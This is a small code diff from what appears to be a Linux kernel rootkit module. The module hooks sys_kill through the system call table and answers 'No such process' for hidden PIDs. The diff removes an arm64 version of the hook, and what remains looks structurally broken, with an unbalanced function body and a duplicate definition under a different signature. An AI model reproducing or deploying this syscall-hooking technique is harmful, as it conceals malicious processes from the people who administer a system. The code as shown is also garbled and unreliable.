@@ -16,22 +16,7 @@ static asmlinkage long (*original_sys_kill)(pid_t pid, int sig);
 // Pointer to the system call table
 static unsigned long **p_sys_call_table;
 
-// Our hooked sys_kill function
-static asmlinkage long hooked_sys_kill(const struct pt_regs *regs)
-{
-    // On arm64, arguments are in regs->regs[0], regs->regs[1], etc.
-    pid_t pid = (pid_t)regs->regs[0];
-    int sig = (int)regs->regs[1];
 
-    if (is_pid_hidden(pid)) {
-        // Return "No such process"
-        return -ESRCH;
-    }
-
-    // If the pid is not hidden, call the original function, but check if it's valid first
-    if (original_sys_kill) {
-        return original_sys_kill(pid, sig);
-    }
 
     // Our hooked sys_kill function
 static asmlinkage long hooked_sys_kill(pid_t pid, int sig)
